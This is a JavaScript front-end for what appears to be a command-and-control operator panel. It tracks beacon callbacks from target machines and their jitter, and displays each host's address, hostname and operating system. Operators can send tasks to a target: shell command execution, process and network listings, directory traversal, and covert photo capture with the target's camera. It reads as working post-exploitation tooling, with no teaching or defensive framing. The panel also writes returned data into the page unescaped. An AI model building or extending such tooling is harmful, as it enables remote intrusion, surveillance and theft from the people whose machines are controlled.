// =================================================================================
// Global Variables and Constants
// =================================================================================

let beaconTimers = {};
let loadingDotsInterval;

const taskDescriptions = {
    'systeminfo': 'Retrieve system information including OS, uptime, and hardware details.',
    'list_dir': 'List the contents of the specified directory.',
    'shell': 'Execute a shell command on the target system.',
    'close': 'Close the connection with the beacon.',
    'processes': 'List all running processes on the target system.',
    'diskusage': 'Check disk usage on the target system.',
    'netstat': 'Display network statistics and connections.',
    'session': 'Switch the beacon to session mode.',
    'directory_traversal': 'Perform directory traversal operations on the target system.',
    'takephoto': 'Capture a photo using the target system’s camera.'
};

// =================================================================================
// Main Initialization
// =================================================================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('Document loaded');
    toggleLoadingSpinner(true);

    initializeWebSocket();
    fetchInitialBeaconData();
    fetchHistory();
    addEventListeners();

    handleTaskSelection();
    submitTask();
});

// =================================================================================
// WebSocket Handling
// =================================================================================

function initializeWebSocket() {
    const socket = io('http://127.0.0.1:8000');

    socket.on('connect', () => {
        console.log('WebSocket connected');
        socket.emit('join', window.uuid);
    });

    socket.on('disconnect', () => console.log('WebSocket disconnected'));
    socket.on('connect_error', (error) => console.error('WebSocket connection error:', error));
    socket.onAny((event, ...args) => console.log(`WebSocket request: Event=${event}, Args=${JSON.stringify(args)}`));

    socket.on('beacon_update', handleBeaconUpdate);
    socket.on('countdown_update', handleCountdownUpdate);
    socket.on('command_response', handleCommandResponse);
    // **FIX: Added dedicated listener for directory traversal**
    socket.on('directory_traversal', handleDirectoryTraversalResponse);
}

function handleBeaconUpdate(data) {
    if (data.beacons && data.beacons[window.uuid]) {
        const singleBeaconData = {
            beacon: data.beacons[window.uuid]
        };
        updateLastBeacon(singleBeaconData);
        updateNextBeacon(window.uuid);
        toggleLoadingSpinner(false);
    }
}

function handleCountdownUpdate(data) {
    if (data.uuid && data.timer !== undefined && data.jitter !== undefined) {
        const countdownElement = document.querySelector(`#countdown-${data.uuid}`);
        if (countdownElement) {
            updateCountdownUI(data);
        } else {
            console.error(`Countdown element not found for uuid: ${data.uuid}`);
        }
    }
}

function handleCommandResponse(data) {
    console.log('Received command_response:', data);
    if (data.uuid === window.uuid) {
        // Fallback check in case the server sends directory data via this event
        if (data.command === 'directory_traversal') {
            updateDirectoryTree(data.response);
        }
        updateResultsTab(data); // Update the general results tab
    } else {
        console.warn(`UUID mismatch: received ${data.uuid}, expected ${window.uuid}`);
    }
}

// **FIX: New function to handle the specific directory traversal event**
function handleDirectoryTraversalResponse(data) {
    const banner = document.getElementById('command-response-banner');
    banner.textContent = 'New Directory Traversal received.';
    banner.classList.remove('d-none');
    setTimeout(() => {
        banner.classList.add('d-none');
    }, 3000);
    console.log('Received dedicated directory_traversal event:', data);
    if (data.uuid === window.uuid) {
        updateDirectoryTree(data.response);
    }
}


// =================================================================================
// API Fetching
// =================================================================================


function fetchDirectoryListing() {
    // 1. Show a loading spinner so the user knows something is happening.
    showDirSpinner(true);
    console.log(`Fetching initial directory listing for ${window.uuid}...`);

    // 2. Call the new, dedicated API endpoint.
    fetch(`/api/v1/beacons/${window.uuid}/directory_traversal`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            // 3. On success, use the existing function to build and display the tree.
            console.log('Successfully fetched directory listing.');
            updateDirectoryTree(data);
        })
        .catch(error => {
            // 4. If an error occurs, show a message to the user.
            console.error('Error fetching directory listing:', error);
            const treeContainer = document.getElementById('dir-tree');
            treeContainer.innerHTML = `<div class="alert alert-warning">Could not load directory listing. Run the 'directory_traversal' task to generate it.</div>`;
        })
        .finally(() => {
            // 5. No matter what, hide the spinner when done.
            showDirSpinner(false);
        });
}


function fetchInitialBeaconData() {
    fetch(`/api/v1/beacons/${window.uuid}`)
        .then(response => {
            if (!response.ok) throw new Error('Network response was not ok');
            return response.json();
        })
        .then(data => {
            console.log('Received beacon data:', data);
            if (!data.beacon) {
                console.error('No beacon data received');
                toggleLoadingSpinner(true);
            } else {
                updateLastBeacon(data);
                updateNextBeacon(window.uuid);
                toggleLoadingSpinner(false);
            }
        })
        .catch(error => {
            console.error('Error fetching beacon:', error);
            toggleLoadingSpinner(true);
        });
}

function fetchHistory() {
    fetch(`/api/v1/beacons?history=${window.uuid}`)
        .then(response => response.json())
        .then(data => {
            const resultsInfo = document.getElementById('results-info');
            resultsInfo.innerHTML = ''; // Clear existing content
            const table = createHistoryTable(data.history);
            resultsInfo.appendChild(table);
        })
        .catch(error => console.error('Error fetching history:', error));
}

// =================================================================================
// UI Update Functions
// =================================================================================

function toggleLoadingSpinner(show) {
    const spinner = document.getElementById('loading-spinner');
    const tableContainer = document.getElementById('beacon-table-container');
    const loadingMessage = document.getElementById('loading-message');

    if (!spinner || !tableContainer || !loadingMessage) {
        console.error('Required elements not found');
        return;
    }

    if (show) {
        spinner.classList.remove('d-none');
        tableContainer.classList.add('d-none');
        loadingMessage.classList.remove('d-none');
        startLoadingDots();
    } else {
        spinner.classList.add('d-none');
        tableContainer.classList.remove('d-none');
        loadingMessage.classList.add('d-none');
        stopLoadingDots();
    }
}

function showDirSpinner(show) {
    const treeC = document.getElementById('dir-tree');
    const listContainer = treeC.querySelector('ul'); // Find the list
    const existingSpinner = document.getElementById('dir-search-spinner');

    if (show) {
        if (listContainer) listContainer.style.display = 'none'; // Hide the list
        if (!existingSpinner) {
            const spinnerHtml = `
                <div id="dir-search-spinner" class="dir-search-spinner-container">
                    <div class="spinner-border text-primary" role="status">
                        <span class="sr-only">Loading...</span>
                    </div>
                </div>`;
            treeC.insertAdjacentHTML('afterbegin', spinnerHtml);
        }
    } else {
        if (existingSpinner) existingSpinner.remove();
        if (listContainer) listContainer.style.display = 'block'; // Show the list
    }
}


function updateLastBeacon(data) {
    const beaconTableBody = document.getElementById('beacon-table-body');
    if (!beaconTableBody) {
        console.error('Beacon table body not found');
        return;
    }

    const beacon = data.beacon;
    const lastBeaconDate = new Date(beacon.last_beacon);

    let row = document.getElementById(`beacon-${window.uuid}`);
    if (!row) {
        row = document.createElement('tr');
        row.id = `beacon-${window.uuid}`;
        row.innerHTML = `
            <td>${window.uuid}</td>
            <td>${beacon.address}</td>
            <td>${beacon.hostname}</td>
            <td>${beacon.operating_system}</td>
            <td><span class="last-beacon">${formatDateWithoutMilliseconds(lastBeaconDate)}</span></td>
            <td><span class="next-beacon" id="next-beacon-${window.uuid}"></span></td>
            <td><span class="countdown" id="countdown-${window.uuid}"></span></td>
        `;
        beaconTableBody.appendChild(row);
    } else {
        row.querySelector('.last-beacon').textContent = formatDateWithoutMilliseconds(lastBeaconDate);
        row.classList.add('highlight');
        setTimeout(() => row.classList.remove('highlight'), 2000);
    }

    beaconTimers[window.uuid] = {
        lastBeacon: lastBeaconDate,
        timer: beacon.timer,
        jitter: beacon.jitter
    };

    console.log('Beacon updated:', data.beacon);
}

function updateNextBeacon(uuid) {
    const countdownElement = document.getElementById(`countdown-${uuid}`);
    if (!countdownElement) return;

    const timerData = beaconTimers[uuid];
    if (!timerData) return;

    const {
        lastBeacon,
        timer,
        jitter
    } = timerData;
    const nextBeaconDate = new Date(lastBeacon.getTime() + Number(timer) * 1000);
    const expectedNextBeaconDate = new Date(nextBeaconDate.getTime() + Number(jitter) * 1000);

    const currentTime = new Date();
    const timeDiff = nextBeaconDate - currentTime;
    const jitterDiff = expectedNextBeaconDate - currentTime;

    if (timeDiff >= 0) {
        countdownElement.textContent = `Next Callback expected in ${formatTime(Math.floor(timeDiff / 1000))}`;
        countdownElement.style.color = 'green';
    } else if (jitterDiff >= 0) {
        countdownElement.textContent = `Expected Callback was ${nextBeaconDate.toISOString()}. It is ${formatTime(Math.abs(Math.floor(timeDiff / 1000)))} late. (Within Jitter)`;
        countdownElement.style.color = 'orange';
    } else {
        countdownElement.textContent = `Expected Callback was ${expectedNextBeaconDate.toISOString()}. It is ${formatTime(Math.abs(Math.floor(jitterDiff / 1000)))} late`;
        countdownElement.style.color = 'red';
    }
}

function updateCountdownUI(data) {
    const {
        uuid,
        timer,
        jitter
    } = data;
    const countdownElement = document.querySelector(`#countdown-${uuid}`);

    const lastBeacon = beaconTimers[uuid].lastBeacon;
    const nextBeaconDate = new Date(lastBeacon.getTime() + (timer * 1000));
    const expectedNextBeaconDate = new Date(nextBeaconDate.getTime() + (jitter * 1000));

    const currentTime = new Date();
    const timeDiff = nextBeaconDate - currentTime;
    const jitterDiff = expectedNextBeaconDate - currentTime;

    if (timeDiff >= 0) {
        countdownElement.textContent = `Next Callback expected in ${formatTime(Math.floor(timeDiff / 1000))}`;
        countdownElement.style.color = 'green';
    } else if (jitterDiff >= 0) {
        countdownElement.textContent = `Expected Callback was ${nextBeaconDate.toISOString()}. It is ${formatTime(Math.abs(Math.floor(timeDiff / 1000)))} late. (Within Jitter)`;
        countdownElement.style.color = 'orange';
    } else {
        countdownElement.textContent = `Expected Callback was ${expectedNextBeaconDate.toISOString()}. It is ${formatTime(Math.abs(Math.floor(jitterDiff / 1000)))} late`;
        countdownElement.style.color = 'red';
    }

    beaconTimers[uuid].lastBeacon = new Date(expectedNextBeaconDate.getTime() - jitterDiff);

    const row = document.getElementById(`beacon-${uuid}`);
    if (row) {
        row.classList.add('bg-success', 'text-white');
        setTimeout(() => {
            row.classList.remove('bg-success', 'text-white');
        }, 1000);
    }
}

function updateResultsTab(data) {
    const resultsTableBody = document.getElementById('results-table-body');
    if (!resultsTableBody) {
        console.error('results-table-body element not found');
        return;
    }

    const existingRow = resultsTableBody.querySelector(`tr[data-command-id="${data.command_id}"]`);
    if (existingRow) {
        existingRow.querySelector('td:nth-child(3)').innerHTML = `<pre><code>${data.response}</code></pre>`;
    } else {
        const noHistoryRow = resultsTableBody.querySelector('tr td[colspan="3"]');
        if (noHistoryRow) {
            noHistoryRow.parentElement.remove();
        }
        const tr = document.createElement('tr');
        tr.setAttribute('data-command-id', data.command_id);
        const commandText = data.data ? `${data.command} ${data.data}` : data.command;
        tr.innerHTML = `
            <td>${data.command_id}</td>
            <td>${commandText}</td>
            <td><pre><code>${data.response}</code></pre></td>
        `;
        resultsTableBody.appendChild(tr);
    }

    const banner = document.getElementById('command-response-banner');
    banner.textContent = 'New command response received.';
    banner.classList.remove('d-none');
    setTimeout(() => {
        banner.classList.add('d-none');
    }, 3000);
}

function updateDirectoryTree(response) {
    const treeContainer = document.getElementById('dir-tree');
    treeContainer.innerHTML = ''; // Clear previous content

    // Helper function to process the final JSON object
    const processJson = (json) => {
        if (!json || Object.keys(json).length === 0) {
            treeContainer.innerHTML = '<div class="text-center text-muted mt-3">No directory data found. <br> Run the directory_traversal task.</div>';
            return;
        }
        treeContainer.appendChild(buildTree(json));
    };

    if (typeof response === 'string') {
        // If we have a string, use the worker to parse it off the main thread
        const worker = new Worker('/static/parser.worker.js');

        worker.onmessage = function(event) {
            if (event.data.success) {
                processJson(event.data.data);
            } else {
                console.error('Worker failed to parse JSON:', event.data.error);
                treeContainer.innerHTML = `<div class="alert alert-danger">Error parsing directory data in worker.</div>`;
            }
            worker.terminate(); // Clean up the worker
        };
        
        worker.onerror = function(error) {
            console.error('An error occurred in the JSON parser worker:', error);
            worker.terminate();
        };

        // Send the JSON string to the worker to start parsing
        worker.postMessage(response);

    } else {
        // If it's already an object (from fetch), process it directly
        processJson(response);
    }
}

// =================================================================================
// DOM and Event Listeners
// =================================================================================

function addEventListeners() {
    document.getElementById('task-btn').addEventListener('click', (event) => showInfo('task-info', event));
    document.getElementById('results-btn').addEventListener('click', (event) => showInfo('results-info', event));
    document.getElementById('directory-btn').addEventListener('click', (event) => {
        showInfo('directory-info', event);
    });
    document.getElementById('media-btn').addEventListener('click', (event) => showInfo('media-info', event));

    let searchTimeout;
    document.getElementById('dir-search').addEventListener('input', e => {
        clearTimeout(searchTimeout);
        const treeC = document.getElementById('dir-tree');
        const listItems = treeC.querySelectorAll('li');
        const summaryEl = document.getElementById('search-results-summary'); // Get the summary element

        if (listItems.length > 0) {
            showDirSpinner(true);
        }
        
        const term = e.target.value.toLowerCase();

        searchTimeout = setTimeout(() => {
            let hasVisibleItems = false;
            let hitCount = 0; // Initialize hit counter

            listItems.forEach(li => {
                const nodeName = li.dataset.name;
                const selfMatch = nodeName.includes(term);
                const childMatch = Array.from(li.querySelectorAll('li'))
                                        .some(c => c.dataset.name.includes(term));
                
                const isVisible = (term === '' || selfMatch || childMatch);
                li.style.display = isVisible ? 'block' : 'none';
                
                if (isVisible) {
                    hasVisibleItems = true;
                    // To get an accurate count, we only count a visible item if its parent is hidden.
                    // This prevents counting every file inside a matched folder.
                    const parentLi = li.parentElement.closest('li');
                    if (!parentLi || parentLi.style.display === 'none') {
                        hitCount++;
                    }
                }
            });

            showDirSpinner(false);

            // Update search summary text
            if (term === '') {
                summaryEl.textContent = ''; // Clear summary if search is empty
            } else if (hitCount === 1) {
                summaryEl.textContent = 'Found 1 result.';
            } else {
                summaryEl.textContent = `Found ${hitCount} results.`;
            }
            
            const noResultsMessage = document.getElementById('no-search-results');
            if (!hasVisibleItems && term !== '') {
                if (!noResultsMessage) {
                    treeC.insertAdjacentHTML('beforeend', '<p id="no-search-results" class="text-muted text-center mt-3">No matching files or folders found.</p>');
                }
            } else {
                if (noResultsMessage) noResultsMessage.remove();
            }
        }, 300);
    });

    setInterval(() => updateNextBeacon(window.uuid), 1000);
}

function showInfo(infoId, event) {
    const currentInfo = document.querySelector('.info-content:not(.d-none)');
    const newInfo = document.getElementById(infoId);
    if (currentInfo === newInfo) return;

    const clickedButton = event.target;
    const direction = clickedButton.getAttribute('data-direction');

    const slideOutClass = direction === 'left' ? 'slide-out-right' : 'slide-out-left';
    const slideInClass = direction === 'left' ? 'slide-in-left' : 'slide-in-right';

    currentInfo.classList.add(slideOutClass);
    currentInfo.classList.remove('slide-in-left', 'slide-in-right');

    currentInfo.addEventListener('animationend', () => {
        currentInfo.classList.add('d-none');
        currentInfo.classList.remove(slideOutClass);

        newInfo.classList.remove('d-none');
        newInfo.classList.add(slideInClass);
    }, {
        once: true
    });
}

function handleTaskSelection() {
    const taskSelect = document.getElementById('task-select');
    const taskDescription = document.getElementById('task-description');
    const descriptionText = document.getElementById('description-text');
    const taskInput = document.getElementById('task-input');
    const taskTextbox = document.getElementById('task-textbox');

    taskSelect.addEventListener('change', () => {
        const selectedValue = taskSelect.value;
        if (selectedValue && taskDescriptions[selectedValue]) {
            descriptionText.textContent = taskDescriptions[selectedValue];
            taskDescription.classList.remove('d-none');

            const tasksRequiringInput = ['list_dir', 'shell', 'directory_traversal'];
            if (tasksRequiringInput.includes(selectedValue)) {
                taskInput.classList.remove('d-none', 'hide');
                taskInput.classList.add('show');
                // Set placeholder for directory traversal
                if (selectedValue === 'directory_traversal') {
                    taskTextbox.placeholder = "Enter path (e.g., . or C:\\Users)";
                } else {
                    taskTextbox.placeholder = "Enter your input here";
                }
            } else {
                taskInput.classList.remove('show');
                taskInput.classList.add('hide');
                taskTextbox.value = '';
            }
        } else {
            taskDescription.classList.add('d-none');
            taskInput.classList.remove('show');
            taskInput.classList.add('hide');
            descriptionText.textContent = '';
            taskTextbox.value = '';
        }
        validateForm();
    });

    taskTextbox.addEventListener('input', validateForm);
}

function submitTask() {
    const submitBtn = document.getElementById('submit-task-btn');
    submitBtn.addEventListener('click', () => {
        const taskSelect = document.getElementById('task-select').value;
        const taskInput = document.getElementById('task-textbox').value.trim();

        const tasksRequiringInput = ['list_dir', 'shell'];
        // Directory traversal can be sent with an empty input (defaults to '.')
        const requiresInput = tasksRequiringInput.includes(taskSelect);

        if (!taskSelect || (requiresInput && !taskInput)) {
            alert('Please select a task and provide the required input.');
            return;
        }

        const command_id = generateUUID();
        // For directory_traversal, if input is empty, send '.' as the default path
        const dataForTask = (taskSelect === 'directory_traversal' && taskInput === '') ? '.' : taskInput;

        const payload = {
            command_id: command_id,
            task: taskSelect,
            data: dataForTask || null
        };

        fetch(`/api/v1/beacons?command=${window.uuid}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) throw new Error('Network response was not ok');
                showConfirmationAlert();
                addTaskToResultsTab(command_id, taskSelect, dataForTask);
                resetTaskForm();
            })
            .catch(error => {
                console.error('Error submitting task:', error);
                alert('Failed to submit task.');
            });
    });
}

// =================================================================================
// Helper and Utility Functions
// =================================================================================

function startLoadingDots() {
    let dotCount = 0;
    loadingDotsInterval = setInterval(() => {
        dotCount = (dotCount + 1) % 4;
        const dots = '.'.repeat(dotCount);
        document.getElementById('loading-message').textContent = `Waiting for beacons${dots}`;
    }, 500);
}

function stopLoadingDots() {
    clearInterval(loadingDotsInterval);
}

function formatDateWithoutMilliseconds(date) {
    const day = date.getDate().toString().padStart(2, '0');
    const month = (date.getMonth() + 1).toString().padStart(2, '0');
    const hours = date.getHours().toString().padStart(2, '0');
    const minutes = date.getMinutes().toString().padStart(2, '0');
    const seconds = date.getSeconds().toString().padStart(2, '0');
    return `${day}/${month} ${hours}:${minutes}:${seconds}`;
}

function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}m ${remainingSeconds}s`;
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0,
            v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function validateForm() {
    const taskSelect = document.getElementById('task-select').value;
    const taskInput = document.getElementById('task-textbox').value.trim();
    const submitBtn = document.getElementById('submit-task-btn');

    if (!taskSelect) {
        submitBtn.disabled = true;
        return;
    }

    const tasksRequiringInput = ['list_dir', 'shell'];
    if (tasksRequiringInput.includes(taskSelect)) {
        submitBtn.disabled = taskInput === '';
    } else {
        submitBtn.disabled = false;
    }
}

function createHistoryTable(history) {
    const table = document.createElement('table');
    table.classList.add('table');
    table.innerHTML = `
        <thead>
            <tr>
                <th>Command ID</th>
                <th>Command</th>
                <th>Response</th>
            </tr>
        </thead>
        <tbody id="results-table-body"></tbody>
    `;
    const tbody = table.querySelector('#results-table-body');
    if (history && history.length > 0) {
        history.forEach(item => {
            const tr = document.createElement('tr');
            tr.setAttribute('data-command-id', item.command_id);
            const commandText = item.data ? `${item.command} ${item.data}` : item.command;
            tr.innerHTML = `
                <td>${item.command_id}</td>
                <td>${commandText}</td>
                <td><pre><code>${item.response}</code></pre></td>
            `;
            tbody.appendChild(tr);
        });
    } else {
        const tr = document.createElement('tr');
        tr.innerHTML = '<td colspan="3">No history available.</td>';
        tbody.appendChild(tr);
    }
    return table;
}

function buildTree(obj) {
    const ul = document.createElement('ul');
    ul.className = 'list-group list-group-flush';

    // Helper function to format file sizes
    function formatBytes(bytes, decimals = 2) {
        if (!+bytes) return '0 Bytes';
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
    }

    for (let key of Object.keys(obj)) {
        if (key === '_errors') continue;

        const value = obj[key];
        const li = document.createElement('li');
        li.className = 'list-group-item p-0';
        li.dataset.name = key.toLowerCase();

        // A branch is an object that isn't a file (doesn't have a 'size' property)
        const isBranch = value && typeof value === 'object' && !value.hasOwnProperty('size');
        
        // --- LAZY LOADING LOGIC ---
        // Mark the branch as not yet built
        if (isBranch) {
            li.dataset.isBuilt = 'false';
            // Store the raw children data on the element itself to be used later
            li.dataset.children = JSON.stringify(value); 
        }

        const header = document.createElement('div');
        header.className = 'd-flex align-items-center p-1';
        header.style.cursor = 'pointer';

        header.onclick = (e) => {
            if (isBranch) {
                const toggle = header.querySelector('.toggle');
                const isOpen = toggle.textContent === '▾';

                // On first click, build the sub-tree
                if (li.dataset.isBuilt === 'false') {
                    const childrenData = JSON.parse(li.dataset.children);
                    const childUl = buildTree(childrenData);
                    childUl.classList.add('ml-4');
                    li.appendChild(childUl);
                    li.dataset.isBuilt = 'true'; // Mark as built
                    li.dataset.children = ''; // Clear the stored data
                }

                // Toggle visibility
                const childUl = li.querySelector('ul');
                if (childUl) {
                    childUl.style.display = isOpen ? 'none' : 'block';
                }
                toggle.textContent = isOpen ? '▸' : '▾';
                
            } else {
                // This part is for files and remains the same
                const fileInfoBody = document.getElementById('fileInfoBody');
                const createdDate = new Date(value.created).toLocaleString();
                const modifiedDate = new Date(value.lastModified).toLocaleString();

                document.getElementById('fileInfoModalLabel').innerText = `File Details: ${key}`;
                fileInfoBody.innerHTML = `
                    <p><strong>Size:</strong> ${formatBytes(value.size)} (${value.size.toLocaleString()} bytes)</p>
                    <p><strong>Created:</strong> ${createdDate}</p>
                    <p><strong>Last Modified:</strong> ${modifiedDate}</p>
                    <p><strong>Attributes:</strong> ${value.attributes}</p>
                `;
                $('#fileInfoModal').modal('show');
            }
        };

        // --- UI elements remain mostly the same ---
        const icon = document.createElement('span');
        icon.textContent = getIconForFile(key, isBranch);
        icon.className = isBranch ? 'folder-icon' : 'file-icon';
        header.appendChild(icon);

        const toggle = document.createElement('span');
        toggle.className = 'toggle';
        toggle.textContent = isBranch ? '▸' : ' ';
        header.appendChild(toggle);

        const name = document.createElement('span');
        name.className = 'node-name';
        name.textContent = key;
        header.appendChild(name);

        li.appendChild(header);
        ul.appendChild(li);
    }

    return ul;
}


function getIconForFile(key, isBranch) {
    if (isBranch) return '📁';
    const ext = key.split('.').pop().toLowerCase();
    const iconMap = {
        'png': '🖼️',
        'jpg': '🖼️',
        'jpeg': '🖼️',
        'gif': '🖼️',
        'bmp': '🖼️',
        'svg': '🖼️',
        'pdf': '📕',
        'doc': '📄',
        'docx': '📄',
        'xls': '📊',
        'xlsx': '📊',
        'csv': '📊',
        'mp3': '🎵',
        'wav': '🎵',
        'ogg': '🎵',
        'mp4': '🎞️',
        'avi': '🎞️',
        'mov': '🎞️',
        'mkv': '🎞️'
    };
    return iconMap[ext] || '📃';
}

function showConfirmationAlert() {
    const confirmationAlert = document.getElementById('confirmation-alert');
    confirmationAlert.classList.remove('d-none');
    setTimeout(() => {
        confirmationAlert.classList.add('d-none');
    }, 5000);
}

function addTaskToResultsTab(command_id, taskSelect, taskData) {
    const resultsTableBody = document.getElementById('results-table-body');
    const noHistoryRow = resultsTableBody.querySelector('tr td[colspan="3"]');
    if (noHistoryRow) {
        noHistoryRow.parentElement.remove();
    }
    const tr = document.createElement('tr');
    tr.setAttribute('data-command-id', command_id);

    const commandText = taskData ? `${taskSelect} ${taskData}` : taskSelect;

    tr.innerHTML = `
        <td>${command_id}</td>
        <td>${commandText}</td>
        <td>Awaiting Response...</td>
    `;
    resultsTableBody.appendChild(tr);
}

function resetTaskForm() {
    document.getElementById('submit-task-btn').disabled = true;
    document.getElementById('task-select').value = '';
    const taskTextbox = document.getElementById('task-textbox');
    taskTextbox.value = '';
    taskTextbox.placeholder = 'Enter your input here';
    const taskInputContainer = document.getElementById('task-input');
    taskInputContainer.classList.add('hide');
    taskInputContainer.classList.remove('show');
    document.getElementById('task-description').classList.add('d-none');
}

// Expose necessary functions to the global scope
window.beaconTimers = beaconTimers;
window.formatDateWithoutMilliseconds = formatDateWithoutMilliseconds;
window.updateNextBeacon = updateNextBeacon;
window.toggleLoadingSpinner = toggleLoadingSpinner;